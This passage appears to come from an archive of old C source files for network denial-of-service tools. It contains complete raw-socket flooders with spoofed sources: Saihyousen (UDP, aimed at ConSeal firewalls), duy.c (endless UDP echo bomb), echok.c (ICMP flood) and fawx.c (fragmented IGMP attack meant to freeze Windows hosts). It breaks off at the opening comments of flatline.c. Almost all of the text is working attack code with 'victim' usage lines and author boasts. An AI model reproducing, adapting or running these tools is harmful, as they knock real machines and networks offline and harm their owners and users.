            "    pkt.icmp_hdr.icmp_type   = ICMP_PARAMETERPROB;",
            "    pkt.icmp_hdr.icmp_code   = 0;",
            "    pkt.icmp_hdr.icmp_cksum  = in_cksum((u_short *)&pkt.icmp_hdr, ICMPHDRLEN);",
            "    ",
            "    if (sendto(sock, &pkt, IPHDRLEN + ICMPHDRLEN, 0, (struct sockaddr *)&sin,",
            "\t\tsizeof(struct sockaddr)) == -1)",
            "    {",
            "\tperror(\"sendto\");",
            "\tclose(sock);",
            "\texit(-1);",
            "    }",
            "    ",
            "    pkt.ip_hdr.ip_off   = 0;",
            "    if (sendto(sock, &pkt, IPHDRLEN + ICMPHDRLEN, 0, (struct sockaddr *)&sin,",
            "\t\tsizeof(struct sockaddr)) == -1)",
            "    {",
            "\tperror(\"sendto\");",
            "\tclose(sock);",
            "\texit(-1);",
            "    }",
            "    ",
            "    close(sock);",
            "daemonize(void)",
            "    int fd;",
            "    ",
            "    signal(SIGTTOU, SIG_IGN);",
            "    signal(SIGTSTP, SIG_IGN);",
            "    signal(SIGTTIN, SIG_IGN);",
            "    ",
            "    switch(fork())",
            "    {",
            "\tcase -1:",
            "\t    perror(\"daemonize(): fork()\");",
            "\t    exit(-1);",
            "\t    /* NOTREACHED */",
            "\tcase 0:",
            "\t    break;",
            "\t    /* NOTREACHED */",
            "\tdefault:",
            "\t    exit(0);",
            "\t    /* NOTREACHED */",
            "    }",
            "    ",
            "    if (setpgrp() == -1)",
            "    {",
            "\tperror(\"setpgrp\");",
            "\texit(-1);",
            "    }",
            "    ",
            "    fd  = open(\"/dev/tty\", O_RDWR);",
            "    if (fd >= 0)",
            "    {",
            "\tif (ioctl(fd, TIOCNOTTY, (char *)NULL) == -1)",
            "\t    perror(\"ioctl\");",
            "\t    close(fd);",
            "\t    exit(-1);",
            "\tclose(fd);",
            "    }",
            "    ",
            "    chdir(\"/\");",
            "    umask(0);",
            "void",
            "usage(u_char *namez)",
            "    fprintf(stderr, \"Invalid usage.\\n\"",
            "\t    \"usage:\\t%s src_host|ip dst_host|ip iterations\\n\", namez);",
            "    exit(-1);",
            "main(int argc, char **argv)",
            "    struct in_addr inaddr;",
            "    u_long src_ip, dst_ip;",
            "    u_int iterations, i = 0;",
            "    ",
            "    if (getuid() && geteuid())",
            "    {",
            "\tfprintf(stderr, \"Insufficient privileges (uid|euid == 0)\\n\");",
            "\texit(-1);",
            "    }",
            "    ",
            "    if (argc != 4)",
            "    {",
            "\tusage(argv[0]);",
            "\t/* NOTREACHED */",
            "    }",
            "    ",
            "    src_ip  = resolve_host(argv[1]);",
            "    dst_ip  = resolve_host(argv[2]);",
            "    ",
            "    if (src_ip == -1 || dst_ip == -1)",
            "    {",
            "\tfprintf(stderr, \"Invalid host|ip: `%s`.\\n\",",
            "\t\t(src_ip == -1 ? argv[1] : argv[2]));",
            "\texit(-1);",
            "    }",
            "    ",
            "    iterations  = (u_int)atoi(argv[3]);",
            "    ",
            "    inaddr.s_addr = src_ip;",
            "    fprintf(stderr, \"DoS: (%s) -> \", inet_ntoa(inaddr));",
            "    inaddr.s_addr = dst_ip;",
            "    fprintf(stderr, \"(%s) [%d]\\n\", inet_ntoa(inaddr), iterations);",
            "    ",
            "    if (daemonize() == -1)",
            "    {",
            "\tfprintf(stderr, \"Cannot become daemon.\\n\");",
            "\texit(-1);",
            "    }",
            "    ",
            "    fprintf(stderr, \"Successfully daemonized, launching attack.\\n\");",
            "    for (; i < iterations; i++)",
            "    {",
            "\tpredator(src_ip, dst_ip);",
            "    }",
            "    ",
            "    fprintf(stderr, \"\\nCompleted `%d` iterations.\\n\", iterations);",
            "    exit(0);",
            "/* EOF */",
            "datapool/src/conseal.c",
            "0100644",
            "0000000",
            "0000000",
            "00000013164",
            "07051164074",
            "013750",
            "ustar  ",
            "root",
            "root",
            "/* Saihyousen Attack (*Japanese* Ice Breaker), By Noc-Wage (M.C.S.R)",
            " * Base code from arnudp.c but HEAVILY modified. Originally written",
            " * sometime early April 1998, I'm a little fuzzy as to the date.",
            " * I take no responsibility for the actions of any script kiddies who",
            " * think that running this against some one is a fun way to pass away",
            " * their useless lives.  I also in NO WAY claim to be good at",
            " * programming, so modify it all you want, just leave credit to me",
            " * and PLEASE send me a copy of your modified code.",
            " * I chose ice breaker because the night before writing this program",
            " * I read through all of William Gibson's Neuromancer while cradling",
            " * an empty bottle of Canadian Club and sick with the flu.",
            " * HOW IT WORKS:",
            " * The way this program kills the machine happens in 2 ways",
            " * #1 If Conseal is set for \"learning\" mode the flooding packets from",
            " * all the different IPs and ports will cause the program to continously",
            " * attempt to write more and more new rules.  This eventually uses up",
            " * all the resources and results in a freeze and eventually a reboot.",
            " * #2 If ConSeal is set to log attacks, once again because of the number",
            " * of packets the system resources are eaten up and the machine dies.",
            " * I tested dx2/66 running RedHat 4.0 (12 megs of ram)",
            " * as the attacker and a Pentium 233 (64 megs of ram)",
            " * as the victim.  Using ConSeal The pentium 233 froze after about 5",
            " * seconds of attack. (This is on an ethernet, but I had done live",
            "testing",
            " * over ppp connection (33.6/28.8) and it took only  few more seconds.",
            " * Because the packets are so small a 28.8 dial-up would not get lag at",
            " * all, 14.4 would get minor after about 20,000 packets.  So send as",
            "many",
            " * as you want, generally 40,000 will kill anything.",
            " * Shouts: My foolish friend who's addicted to ICQ: Essence",
            " *    #Snickers especially humble(horizon), colonwq, n`tropy, sheenie,",
            "sygma!",
            " *         Howdy to fellow Miltonians Acid_Red (Mully and Tom)",
            " *     #hackers, `Lo SUidRoot, iCBM, drsmoke, EPiC, trix, modred, halt",
            " *         And all the rest!",
            " *     Don't we all miss TRON?",
            " *    Nullifier, my cousin (Hey Al H***)",
            "/* Should compile on all linux, not too sure about BSD, if you modify it",
            "to make",
            " * it better in some way please mail it too me, I'd be interested in",
            "seeing it. */",
            "#include<sys/types.h>",
            "#include<sys/socket.h>",
            "#include<netinet/in_systm.h>",
            "#include<netinet/in.h>",
            "#include<netinet/ip.h>",
            "#include<netinet/udp.h>",
            "#include<errno.h>",
            "#include<strings.h>",
            "#include<netdb.h>",
            "#include <stdlib.h>",
            "#include<stdio.h>",
            "#ifdef BROKEN_LIBC",
            "#include <arpa/inet.h>",
            "#else",
            "#define u_char unsigned char",
            "#define u_short unsigned short",
            "#endif",
            "struct sockaddr sa;",
            "int main(int argc,char **argv)",
            "int fd;",
            "int x=1;",
            "int hosti=192;",
            "int hostii=168;",
            "int hostiii=1;",
            "int meep=0;",
            "int fooport=1;",
            "int numpack=0;",
            "char funhost[15];",
            "struct sockaddr_in *p;",
            "struct hostent *he;",
            "u_char gram[36]=",
            " 0x45, 0x00, 0x00, 0x26,",
            " 0x12, 0x34, 0x00, 0x00,",
            " 0xFF, 0x11, 0, 0,",
            " 0, 0, 0, 0,",
            " 0, 0, 0, 0,",
            " 0, 0, 0, 0,",
            " 0x00, 0x12, 0x00, 0x00,",
            " '3','1','3','3','7','8','9','0'",
            "if(argc!=3)",
            " fprintf(stderr,\"Saihyousen, by Noc-Wage\\n\");",
            " fprintf(stderr,\"The faster your connection to the internet is (latency",
            "wise, not bandwidth)\\n\");",
            " fprintf(stderr,\"and the lower the CPU speed of the victim",
            "will\\nincrease probability of success\\n\");",
            " fprintf(stderr,\"usage: %s victim num_of_packets Ex: saihyousen",
            "127.0.0.1 40000\\n\",*argv);",
            " exit(1);",
            "if((fd=socket(AF_INET,SOCK_RAW,IPPROTO_RAW))== -1)",
            " perror(\"requires RAW SOCKETS\");",
            " exit(1);",
            "#ifdef IP_HDRINCL",
            "if (setsockopt(fd,IPPROTO_IP,IP_HDRINCL,(char*)&x,sizeof(x))<0)",
            " perror(\"setsockopt IP_HDRINCL\");",
            " exit(1);",
            "        };",
            "#else",
            "fprintf(stderr,\"we don't have IP_HDRINCL :-(\\n\\n\");",
            "#endif",
            "/* The stuff below is so that it's not fully sequential  i.e",
            "   100.100.100.101, 100.100.100.102  */",
            "for (numpack=0;numpack<=atoi(argv[2]);numpack++) {",
            " if (meep==0) { ++hosti; meep++; }",
            " if (hosti>254) hosti=1;",
            " if (meep==1) { ++hostii; meep++;}",
            " if (hostii>254) hostii=1;",
            " if (meep==2) { ++hostiii; meep=0;}",
            " if (hostiii>254) hostiii=1;",
            "sprintf( funhost, \"%i.%i.%i.%i\",hosti,hostii,hostiii,hosti);",
            "(he=gethostbyname(funhost));",
            "bcopy(*(he->h_addr_list),(gram+12),4);",
            "if((he=gethostbyname(argv[1]))==NULL)",
            " fprintf(stderr,\"can't resolve destination hostname\\n\");",
            " exit(1);",
            "bcopy(*(he->h_addr_list),(gram+16),4);",
            "fooport++;",
            "/* resets the port to 1 if it's nearing the end of possible values */",
            "if (fooport>65530) {fooport=1;};",
            "*(u_short*)(gram+20)=htons((u_short)fooport);",
            "*(u_short*)(gram+22)=htons((u_short)fooport);",
            "p=(struct sockaddr_in*)&sa;",
            "p->sin_family=AF_INET;",
            "bcopy(*(he->h_addr_list),&(p->sin_addr),sizeof(struct in_addr));",
            "if((sendto(fd,&gram,sizeof(gram),0,(struct sockaddr*)p,sizeof(struct",
            "sockaddr)))== -1)",
            " perror(\"sendto\");",
            " exit(1);",
            "/* printf(\"Packet # %i\\n\", numpack); */",
            "/* Turn that on to see where you are.. it'll slow the attack though */",
            "printf(\"Attack against %s finished\", argv[1]);",
            "putchar('\\n');",
            "return 1;",
            "/* How to protect yourself?",
            " * Well it's fairly simple, disable learning and logging mode.",
            " * Signal9 has been made aware of this problem LONG before I decided",
            " * to release it, so people who actually paid for it and keep their copy",
            " * updated should have no problems.  Those of you out there who used",
            " * a crack or a key generator are probably the type that sit on IRC",
            " * warez channels all day. As we all know IRC is a very dangerous",
            " * place for warez pups so I guess you aren't as protected as you may",
            " * think.",
            " * www.signal9.com you can download and upgrade the exsisting",
            " * copy that you own.",
            " * Don't come crying to me if your pirated copy of a rather inexpensive",
            " * piece of software blows up in your face.",
            "datapool/src/duy.c",
            "0100644",
            "0000000",
            "0000000",
            "00000002145",
            "07071420315",
            "013115",
            "ustar  ",
            "root",
            "root",
            "#define BOMB_STRING \"1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF\"",
            "#define BOMB_SIZE 48",
            "#include <stdio.h>",
            "#include <sys/param.h>",
            "#include <sys/socket.h>",
            "#include <netinet/in.h>",
            "#include <netdb.h>",
            "#include <stdarg.h>",
            "int echo_connect(char *, short);",
            "int echo_connect(char *server, short port)",
            "   struct sockaddr_in sin;",
            "   struct hostent *hp;",
            "   int thesock;",
            "   hp = gethostbyname(server);",
            "   if (hp==NULL) {",
            "      printf(\"Unknown host: %s\\n\",server);",
            "      exit(0);",
            "   }",
            "   printf(\"Packeting %s:%d\\n\", server, port);",
            "   bzero((char*) &sin,sizeof(sin));",
            "   bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);",
            "   sin.sin_family = hp->h_addrtype;",
            "   sin.sin_port = htons(port);",
            "   thesock = socket(AF_INET, SOCK_DGRAM, 0);",
            "   connect(thesock,(struct sockaddr *) &sin, sizeof(sin));",
            "   return thesock;",
            "main(int argc, char **argv)",
            "   int s;",
            "   if(argc != 3)",
            "   {",
            "      fprintf(stderr, \"Syntax: %s host any_open_port\\n\",argv[0]);",
            "      exit(0);",
            "   }",
            "   s=echo_connect(argv[1], atoi(argv[2]));",
            "   for(;;)",
            "   {",
            "      send(s, BOMB_STRING, BOMB_SIZE, 0);",
            "   }",
            "datapool/src/echok.c",
            "0100644",
            "0000000",
            "0000000",
            "00000023205",
            "07100655240",
            "013405",
            "ustar  ",
            "root",
            "root",
            " * echok.c",
            " * ICMP_ECHO Killer",
            " * Author: Zakath    Credits:  LOTSA thanks to crisk",
            " * Don't be fooled. Very little is my orig code.",
            " * [03.13.96]",
            "#define RESOLVE_QUIET",
            "#define IPHDRSIZE sizeof(struct iphdr)",
            "#define ICMPHDRSIZE sizeof(struct icmphdr)",
            "#include <sys/types.h>",
            "#include <sys/socket.h>",
            "#include <stdio.h>",
            "#include <unistd.h>",
            "#include <stdlib.h>",
            "#include <string.h>",
            "#include <netdb.h>",
            "#include <netinet/ip.h>",
            "#include <netinet/in.h>",
            "#include <netinet/ip_icmp.h>",
            "#define ECHOK_VER \"1.4\"",
            "/* GENERAL ROUTINES ------------------------------------------- */",
            "void banner(void)",
            "     {",
            "\tprintf(\"\\n                  * ICMP ECHO Killer [v%s] - by Zakath *\", ECHOK_VER);",
            "        printf(\"\\n               * Code based on works by Crisk & Mike Muuss *\\n\\n\");",
            "     }",
            "void usage(const char *progname)",
            "     {",
            "\tprintf(\"\\nusage:\\n  \");",
            "\tprintf(\"%s [-f <-n number>] [-s packet size] [-w wait] <spoof> <dest>\\n\\n\",progname);",
            "\tprintf(\"\\t-f          : enable flooding  (ping -f)\\n\");",
            "\tprintf(\"\\t-n <number> : number of pings to send\\n\");",
            "\tprintf(\"\\t-s <size>   : ICMP_ECHO Packet Size [Default is 64]\\n\");",
            "\tprintf(\"\\t-w <time>   : Wait time between packets [Default is 100]\\n\");",
            "        printf(\"\\t<spoof>     : address of fake ICMP packet sender\\n\");",
            "\tprintf(\"\\t<dest>      : destination of the flood message\\n\");",
            "       \tprintf(\"\\n\");",
            "     }",
            "/* OPTION PARSING -------------------------------------------- */",
            "unsigned char *dest_name;",
            "unsigned char *spoof_name = NULL;",
            "struct sockaddr_in destaddr, spoofaddr;",
            "unsigned long dest_addr;",
            "unsigned long spoof_addr;",
            "unsigned      pingsize, pingsleep, pingnmbr;",
            "char          flood = 0;",
            "int\t\tx = 1;",
            " * in_cksum --",
            " *  Checksum routine for Internet Protocol family headers (C Version)",
            "unsigned short in_cksum(addr, len)",
            "    u_short *addr;",
            "    int len;",
            "    register int nleft = len;",
            "    register u_short *w = addr;",
            "    register int sum = 0;",
            "    u_short answer = 0;",
            "    /*",
            "     * Our algorithm is simple, using a 32 bit accumulator (sum), we add",
            "     * sequential 16 bit words to it, and at the end, fold back all the",
            "     * carry bits from the top 16 bits into the lower 16 bits.",
            "     */",
            "    while (nleft > 1)  {",
            "        sum += *w++;",
            "        nleft -= 2;",
            "    }",
            "    /* mop up an odd byte, if necessary */",
            "    if (nleft == 1) {",
            "        *(u_char *)(&answer) = *(u_char *)w ;",
            "        sum += answer;",
            "    }",
            "    /* add back carry outs from top 16 bits to low 16 bits */",
            "    sum = (sum >> 16) + (sum & 0xffff); /* add hi 16 to low 16 */",
            "    sum += (sum >> 16);         /* add carry */",
            "    answer = ~sum;              /* truncate to 16 bits */",
            "    return(answer);",
            "/* Nice resolve func. by crisk */",
            "int resolve( const char *name, struct sockaddr_in *addr, int port )",
            "     {",
            "\tstruct hostent *host;",
            "\t/* clear everything in case I forget something */",
            "\tbzero((char *)addr,sizeof(struct sockaddr_in));",
            "\tif (( host = gethostbyname(name) ) == NULL )  {",
            "#ifndef RESOLVE_QUIET",
            "\t   fprintf(stderr,\"unable to resolve host \\\"%s\\\" -- \",name);",
            "\t   perror(\"\");",
            "#endif",
            "\t   return -1;",
            "\taddr->sin_family = host->h_addrtype;",
            "\tmemcpy((caddr_t)&addr->sin_addr,host->h_addr,host->h_length);",
            "\taddr->sin_port = htons(port);",
            "     ",
            "        return 0;",
            "     }",
            "unsigned long addr_to_ulong(struct sockaddr_in *addr)",
            "     {",
            "\treturn addr->sin_addr.s_addr;",
            "     }",
            "int resolve_one(const char *name, unsigned long *addr, const char *desc)",
            "     {",
            "        struct sockaddr_in tempaddr;",
            "\tif (resolve(name, &tempaddr,0) == -1) {",
            "\t   printf(\"error: can't resolve the %s.\\n\",desc);",
            "\t   return -1;",
            "            ",
            "\t*addr = tempaddr.sin_addr.s_addr;",
            "       \treturn 0;",
            "     }",
            "int resolve_all(const char *dest,",
            "\t\tconst char *spoof)",
            "     {",
            "        if (resolve_one(dest,&dest_addr,\"dest address\")) return -1;",
            "\tif (spoof!=NULL) ",
            "\t  if (resolve_one(spoof,&spoof_addr,\"spoof address\")) return -1;",
            "\tspoofaddr.sin_addr.s_addr = spoof_addr;",
            "        spoofaddr.sin_family = AF_INET;",
            "\tdestaddr.sin_addr.s_addr = dest_addr;",
            "\tdestaddr.sin_family      = AF_INET;",
            "     }",
            "void give_info(void)",
            "     {",
            "\tprintf(\"# target address          : %s (%s)\\n\",dest_name,inet_ntoa(dest_addr));",
            "\tprintf(\"# spoof-from address      : %s (%s)\\n\\n\",spoof_name,inet_ntoa(spoof_addr));",
            "\tif (pingnmbr) printf(\"# number of packets       : %u\\n\",(pingnmbr));",
            "\tprintf(\"# icmp echo packet size   : %u\\n\",(pingsize+36));",
            "        printf(\"# wait time between send  : %u\\n\\n\", pingsleep);",
            "     }",
            "int parse_args(int argc, char *argv[]) ",
            "     {",
            "        int opt;",
            "\tchar *endptr;",
            "\twhile ((opt=getopt(argc, argv, \"fn:s:w:\")) != -1)  {",
            "\t   switch(opt)  {",
            "\t      case 'f': flood = 1; break;",
            "\t      case 'n': pingnmbr = strtoul(optarg,&endptr,10);",
            "\t                if (*endptr != '\\0')  {",
            "\t\t           printf(\"%s: Invalid Number '%s'.\\n\", argv[0], optarg);",
            "\t\t\t   return -1;",
            "\t           \t}",
            "\t\t        break;",
            "\t      case 's': pingsize = strtoul(optarg,&endptr,10);",
            "\t                if (*endptr != '\\0')  {",
            "\t\t           printf(\"%s: Bad Packet Size '%s'\\n\", argv[0], optarg);",
            "\t\t           return -1;",
            "\t           \t}",
            "\t\t        break;",
            "\t      case 'w': pingsleep = strtoul(optarg,&endptr,10);",
            "\t                if (*endptr != '\\0')  {",
            "\t\t           printf(\"%s: Bad Wait Time '%s'\\n\", argv[0], optarg);",
            "\t\t           return -1;",
            "\t           \t}",
            "\t\t        break;",
            "\t      case '?':",
            "\t      case ':': return -1; break;",
            "\t   }",
            "\t    ",
            "\tif (optind > argc-2)  {",
            "\t   printf(\"%s: missing parameters\\n\",argv[0]);",
            "\t   return -1;",
            "        ",
            "        if (!pingsize)",
            "          pingsize = 28;",
            "        else",
            "          pingsize = pingsize - 36 ;",
            "        if (!pingsleep)",
            "\tspoof_name = argv[optind++];",
            "\tdest_name = argv[optind++];",
            "    \treturn 0; \t\t      \t",
            "     }",
            " * icmp_echo_send()",
            " * builds and sends an ICMP unreachable packet. Since ICMP unreachable packets",
            " * contain the IP header + 64 bits of original datagram, we create a bogus",
            " * IP header and the first 64 bits of a TCP header (ports and syn). ",
            " inline int icmp_echo_send(int                socket, ",
            " \t\t\t   unsigned long      spoof_addr,",
            "\t\t\t   unsigned long      t_addr,",
            "\t\t\t   unsigned           pingsize)",
            "     {",
            "\tunsigned char packet[5122];",
            "\tstruct iphdr   *ip;",
            "\tstruct icmphdr *icmp;",
            "\tstruct iphdr   *origip;",
            "        unsigned char  *data;",
            "        int i;",
            "\tip = (struct iphdr *)packet;",
            "\ticmp = (struct icmphdr *)(packet+IPHDRSIZE);",
            "\torigip = (struct iphdr *)(packet+IPHDRSIZE+ICMPHDRSIZE);",
            "\tdata = (char *)(packet+pingsize+IPHDRSIZE+IPHDRSIZE+ICMPHDRSIZE);",
            "\tmemset(packet, 0, 5122);",
            "/*\tip->saddr    = spoof_addr; */",
            "\tip->version  = 4;",
            "\tip->ihl      = 5; ",
            "\tip->ttl      = 255-random()%15;",
            "\tip->protocol = IPPROTO_ICMP;",
            "\tip->tot_len  = htons(pingsize + IPHDRSIZE + ICMPHDRSIZE + IPHDRSIZE + 8);",
            "        bcopy((char *)&destaddr.sin_addr, &ip->daddr, sizeof(ip->daddr));",
            "        bcopy((char *)&spoofaddr.sin_addr, &ip->saddr, sizeof(ip->saddr)); ",
            "\tip->check    = in_cksum(packet,IPHDRSIZE);",
            "/*        origip->saddr    = t_addr;   this is the 'original' header. */",
            "\torigip->version  = 4;",
            "\torigip->ihl      = 5;",
            "\torigip->ttl      = ip->ttl - random()%15;",
            "\torigip->protocol = IPPROTO_TCP; ",
            "\torigip->tot_len  = IPHDRSIZE + 30; ",
            "\torigip->id       = random()%69;",
            "        bcopy((char *)&destaddr.sin_addr, &origip->saddr, sizeof(origip->saddr));",
            "       \torigip->check = in_cksum(origip,IPHDRSIZE);",
            "\t*((unsigned int *)data)          = htons(pingsize);",
            "\t/* 'original IP header + 64 bits (of bogus TCP header)' made. */",
            "\ticmp->type = 8; /* should be 3 */",
            "\ticmp->code = 0;",
            "\ticmp->checksum = in_cksum(icmp,pingsize+ICMPHDRSIZE+IPHDRSIZE+8);",
            "\treturn sendto(socket,packet,pingsize+IPHDRSIZE+ICMPHDRSIZE+IPHDRSIZE+8,0,",
            "\t\t      (struct sockaddr *)&destaddr,sizeof(struct sockaddr)); ",
            "\t/* ICMP packet is now over the net. */",
            "     }",
            "/* MAIN ------------------------------------------------------ */",
            "void main(int argc, char *argv[])",
            "     {",
            "        int s, i;",
            "        int floodloop;",
            "      \tbanner();",
            "        ",
            "\tif (parse_args(argc,argv)) ",
            "\t  {  ",
            "\t     usage(argv[0]); ",
            "\t     return;",
            "\t  }",
            "\tresolve_all(dest_name, spoof_name);",
            "\tgive_info();",
            "       \t",
            "       \ts = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);",
            "#ifdef IP_HDRINCL",
            "\tfprintf(stderr,\"We have IP_HDRINCL! =] \\n\\n\");",
            "\tif (setsockopt(s,IPPROTO_IP,IP_HDRINCL,(char*)&x,sizeof(x))<0)",
            "\t\t  perror(\"setsockopt IP_HDRINCL\");",
            "\t\t  exit(1);",
            "#else",
            "\tfprintf(stderr,\"We don't have IP_HDRINCL! =[\\n\\n\");",
            "#endif",
            "        if (!flood)",
            "\t  {",
            "\t     if (icmp_echo_send(s,spoof_addr,dest_addr,pingsize) == -1)",
            "\t     {",
            "\t        printf(\"%s: error sending ping packet\\n\",argv[0]); perror(\"\"); return;",
            "\t     }",
            "\t  }",
            "\telse",
            "\t  {",
            "             floodloop = 0;",
            "             if ( pingnmbr && (pingnmbr > 0) )",
            "             {",
            "               printf(\"flooding... packet limit set.\\n\");",
            "               for (i=0;i<pingnmbr;i++)",
            "\t       {",
            "\t\t if (icmp_echo_send(s,spoof_addr,dest_addr,pingsize) == -1) ",
            "\t         {",
            "\t\t    printf(\"%s: error sending packet\\n\",argv[0]); perror(\"\"); return; ",
            "\t         }",
            "\t \t ",
            "\t         if (!(floodloop = (floodloop+1)%25)) ",
            "\t\t  { fprintf(stdout,\".\"); fflush(stdout); ",
            "\t         }",
            " \t       }",
            "               printf(\"flooding completed - %u packets sent.\\n\", pingnmbr);",
            "             }",
            "             else {",
            "               printf(\"flooding. each dot equals 25 packets.\\n\");",
            "               for (i=0;i<1;i)",
            "\t       {",
            "\t\t if (icmp_echo_send(s,spoof_addr,dest_addr,pingsize) == -1) ",
            "\t         {",
            "\t\t    printf(\"%s: error sending packet\\n\",argv[0]); perror(\"\"); return; ",
            "\t         }",
            "\t \t ",
            "\t         if (!(floodloop = (floodloop+1)%25)) ",
            "\t\t  { fprintf(stdout,\".\"); fflush(stdout); ",
            "\t         }",
            " \t       }",
            "             }",
            "\t  }",
            "     }",
            "datapool/src/fawx.c",
            "0100644",
            "0000000",
            "0000000",
            "00000012046",
            "07100655255",
            "013270",
            "ustar  ",
            "root",
            "root",
            "/* fawx.c v1 by ben-z -- igmp-8+frag attack for linux *",
            " *   thanks to datagram for ssping.c - helped lots    *",
            " * -------------------------------------------------- *",
            " * DESCRIPTION:                                       *",
            " *  Sends oversized fragmented IGMP packets to a box  *",
            " *  either making it freeze (WinNT/9x), or lagging    *",
            " *  it to hell and back. Since most win32 firewalls   *",
            " *  dont support IGMP, the attack successfully        *",
            " *  penetrates into the system, making it much more   *",
            " *  effective than an ICMP attack which is likely to  *",
            " *  be filtered.                                      *",
            " * GREETINGS:                                         *",
            " *  mad props to datagram for writing ssping, also    *",
            " *  thanks to #fts(2) on undernet and the psychic     *",
            " *  crew on efnet. shouts to ka0z, cyrus, magicfx,    *",
            " *  ice-e, zeronine, soupnazi, benito, eklipz, c0s,   *",
            " *  metalman, chawp, folk, atomic-, dethwish, sindawg *",
            " *  mosthated, and everyone on irc.slacknet.org..     */",
            "#include <stdio.h>",
            "#include <unistd.h>",
            "#include <stdlib.h>",
            "#include <string.h>",
            "#include <sys/types.h>",
            "#include <sys/time.h>",
            "#include <sys/socket.h>",
            "#include <netdb.h>",
            "#include <netinet/in.h>",
            "#include <netinet/ip.h>",
            "#include <netinet/ip_icmp.h>",
            "#include <netinet/igmp.h>",
            "void banner(void) {",
            "   printf(\" -----------------------------------------------\\n\");\t",
            "   printf(\"| fawx v1 by ben-z: igmp-8+frag spoofing attack |\\n\");",
            "   printf(\" -----------------------------------------------\\n\");",
            "void usage(const char *progname) {",
            "     printf(\"[**] syntax: %s <spoof host> <target host> <number>\\n\",progname);",
            "int resolve( const char *name, unsigned int port, struct sockaddr_in *addr ) {",
            "   struct hostent *host;",
            "   memset(addr,0,sizeof(struct sockaddr_in));",
            "   addr->sin_family = AF_INET;",
            "   addr->sin_addr.s_addr = inet_addr(name);",
            "   if (addr->sin_addr.s_addr == -1) {",
            "      if (( host = gethostbyname(name) ) == NULL )  {",
            "         fprintf(stderr,\"\\nuhm.. %s doesnt exist :P\\n\",name);",
            "         return(-1);",
            "      }",
            "      addr->sin_family = host->h_addrtype;",
            "      memcpy((caddr_t)&addr->sin_addr,host->h_addr,host->h_length);",
            "   }",
            "   addr->sin_port = htons(port);",
            "   return(0);",
            "unsigned short in_cksum(addr, len)",
            "    u_short *addr;",
            "    int len;",
            "    register int nleft = len;",
            "    register u_short *w = addr;",
            "    register int sum = 0;",
            "    u_short answer = 0;",
            "    while (nleft > 1)  {",
            "        sum += *w++;",
            "        nleft -= 2;",
            "    }",
            "    if (nleft == 1) {",
            "        *(u_char *)(&answer) = *(u_char *)w ;",
            "        sum += answer;",
            "    }",
            "    sum = (sum >> 16) + (sum & 0xffff);",
            "    sum += (sum >> 16);\t\t",
            "    answer = ~sum;\t\t",
            "    return(answer);",
            "int send_fawx(int socket,",
            "                 unsigned long spoof_addr,",
            "                 struct sockaddr_in *dest_addr) {",
            "   unsigned char  *packet;",
            "   struct iphdr   *ip;",
            "   struct igmphdr *igmp;",
            "   int rc;",
            "        ",
            "   packet = (unsigned char *)malloc(sizeof(struct iphdr) +",
            "                        \t    sizeof(struct igmphdr) + 8);",
            "   ip = (struct iphdr *)packet;",
            "   igmp = (struct igmphdr *)(packet + sizeof(struct iphdr));",
            "   memset(ip,0,sizeof(struct iphdr) + sizeof(struct igmphdr) + 8);",
            "   ip->ihl      = 5;",
            "   ip->version  = 4;",
            "   ip->id       = htons(34717);",
            "   ip->frag_off |= htons(0x2000);",
            "   ip->ttl      = 255;",
            "   ip->protocol = IPPROTO_IGMP;",
            "   ip->saddr    = spoof_addr;",
            "   ip->daddr\t= dest_addr->sin_addr.s_addr;",
            "   ip->check    = in_cksum(ip, sizeof(struct iphdr));",
            "   igmp->type     \t   = 8;",
            "   igmp->code     \t   = 0;",
            "   if (sendto(socket,",
            "              packet,",
            "              sizeof(struct iphdr) +",
            "              sizeof(struct igmphdr) + 1,0,",
            "              (struct sockaddr *)dest_addr,",
            "              sizeof(struct sockaddr)) == -1) { return(-1); }",
            "   ip->tot_len  = htons(sizeof(struct iphdr) + sizeof(struct igmphdr) + 8);",
            "   ip->frag_off = htons(8 >> 3);",
            "   ip->frag_off |= htons(0x2000);",
            "   ip->check    = in_cksum(ip, sizeof(struct iphdr));",
            "   igmp->type = 0;",
            "   igmp->code = 0;",
            "   if (sendto(socket,",
            "              packet,",
            "              sizeof(struct iphdr) +",
            "              sizeof(struct igmphdr) + 8,0,",
            "              (struct sockaddr *)dest_addr,",
            "              sizeof(struct sockaddr)) == -1) { return(-1); }",
            "   free(packet);",
            " /*  printf(\".\");  <- it looked way too ugly :P */",
            "   return(0);",
            "int main(int argc, char * *argv) {",
            "   struct sockaddr_in dest_addr;",
            "   unsigned int i,sock;",
            "   unsigned long src_addr;",
            "   banner();",
            "   if ((argc != 4)) {",
            "      usage(argv[0]);",
            "      return(-1);",
            "   }",
            "   if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) { ",
            "      fprintf(stderr,\"error opening raw socket. <got root?>\\n\");",
            "      return(-1);",
            "   }",
            "   if (resolve(argv[1],0,&dest_addr) == -1) { return(-1); }",
            "   src_addr = dest_addr.sin_addr.s_addr;",
            "   if (resolve(argv[2],0,&dest_addr) == -1) { return(-1); }",
            "   printf(\"[**] sending igmp-8+frag attacks to: %s.\",argv[2]);",
            "   for (i = 0;i < atoi(argv[3]);i++) {",
            "      if (send_fawx(sock,",
            "                       src_addr,",
            "                       &dest_addr) == -1) {",
            "         fprintf(stderr,\"error sending packet. <got root?>\\n\");",
            "         return(-1);",
            "      }",
            "      ",
            "    }",
            "printf(\" *eof*\\n\");",
            "datapool/src/flatline.c",
            "0100644",
            "0000000",
            "0000000",
            "00000046170",
            "07076335445",
            "014136",
            "ustar  ",
            "root",
            "root",
            "// DISTRIBUTION 4 NOTES :",
            "// The private distribution of flatline #4 has been severly optimized by ",
            "// removing excess function calls and reducing the number of calculations ",
            "// and assignments drastically.  The performance gain is yet to be determined, ",
            "// but I am hoping for an increase from about 12,000 packets per second to",
            "// nearly 30,000.",
            "//   This would fulfill the secondary design requirement - that a maximum ",
            "// throughput be achieved for the minimal system (Soulblazer's) - ",
            "// a Pentium 90 with 48 megs of RAM and a 33.6 kbps modem.",
            "//   Flatline is rapidly aproaching it's design completion and is the most ",
            "// formidable DOS attack program of this time.  Research will continue",
            "// however, as Soulblazer dreams up more and more madness.",
            "// There is a storm brewing...",
            "// Silicate ",
            "/****************************   INCLUDES  ******************************/",
            "#include <unistd.h>               // Symbolic Constants.",
            "#include <stdlib.h>               // Utility Functions.",
            "#include <string.h>               // String Operations.",
